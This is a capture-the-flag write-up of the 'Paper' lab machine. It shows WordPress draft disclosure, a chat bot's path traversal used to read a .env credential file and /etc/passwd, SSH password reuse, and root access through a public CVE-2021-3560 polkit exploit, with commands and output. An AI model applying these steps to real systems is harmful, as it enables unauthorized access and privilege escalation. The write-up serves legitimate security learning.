# PAPER
### User Flag

First of all I used nmap and fuzzed the website but found nothing

```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

If we look around the website nothing interesting seems to appear but if you look at the response from any request we find an interesting field

```
X-Backend-Server: office.paper
```

This means there is a backend server at that location so if we add that to our /etc/host we can connect to it.

```bash
# Static table lookup for hostnames.
# See hosts(5) for details.
127.0.0.1			localhost
10.10.11.143         office.paper
```

Reading through the web we find and interesting comment **"Michael, you should remove the secret content from your drafts ASAP, as they are not that secure as you think!"**
At this point I used wpscan to see if I could find something

```bash
wpscan --url office.paper

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://office.paper/ [10.10.11.143]
[+] Started: Fri Apr 29 07:10:43 2022
...

[!] 32 vulnerabilities identified:
...
```

One of them specially caught my eye "Unauthenticated Users View Private Posts", to apply it you just had to use this url **http://office.paper/?static=1** and the draft page will appear.
Here I found a url to register in a chat website so I did (I also had to add the url at etc/hosts). After reading through the general channel I started messing with the bot to see what I could do.
After some time I ended up looking  ../hubot/.env and I got this


```
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD= ████████
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>

```

Previosly I also looked at /etc/passwd and noticed a user called dwight that matched with who created the bot so I tried connecting via ssh with that user and password an it worked.

### Root flag

Once I was in I just used linpeas.sh as usual although I had to dowload to my machine and then pass it to the victim since it seemed the victim could not connect outside the network

```bash
[kali@kali ~]$ python3 -m http.server 5050

Serving HTTP on 0.0.0.0 port 5050 (http://0.0.0.0:5050/) ...

...

[dwight@paper ~]$ wget 10.10.14.127:5050/linpeas.sh
--2022-04-29 07:44:30--  http://10.10.14.127:5050/linpeas.sh
Connecting to 10.10.14.127:5050... connected.
HTTP request sent, awaiting response... 200 OK
Length: 776167 (758K) [text/x-sh]
Saving to: ‘linpeas.sh.1’

linpeas.sh.1                           100%[===========================================================================>] 757.98K  2.44MB/s    in 0.3s

2022-04-29 07:44:30 (2.44 MB/s) - ‘linpeas.sh.1’ saved [776167/776167]


```

Once I executed it one of the firsts lines underlined in orange said Vulnerable to **CVE-2021-3560**
So I searched for an exploit, I found two (the python one did not work for me)

https://github.com/Almorabea/Polkit-exploit // did not work

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh // worked

I downloaded the script as I did before and used it

```bash
[dwight@paper ~]$ chmod +x poc.sh
[dwight@paper ~]$ ./poc.sh

[!] Username set as : secnigma
[!] No Custom Timing specified.
[!] Timing will be detected Automatically
[!] Force flag not set.
[!] Vulnerability checking is ENABLED!
[!] Starting Vulnerability Checks...
[!] Checking distribution...
[!] Detected Linux distribution as "centos"
[!] Checking if Accountsservice and Gnome-Control-Center is installed
[+] Accounts service and Gnome-Control-Center Installation Found!!
[!] Checking if polkit version is vulnerable
[+] Polkit version appears to be vulnerable!!
[!] Starting exploit...
[!] Inserting Username secnigma...
Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
[+] Inserted Username secnigma  with UID 1005!
[!] Inserting password hash...
[!] It looks like the password insertion was succesful!
[!] Try to login as the injected user using su - secnigma
[!] When prompted for password, enter your password
[!] If the username is inserted, but the login fails; try running the exploit again.
[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
[dwight@paper ~]$ su secnigma
Password:
[secnigma@paper dwight]$ sudo bash
[sudo] password for secnigma:
[root@paper dwight]#

```

default password is *secnigmaftw*. It's normal that it doesn't work at first, I had to do it 3 times until it worked
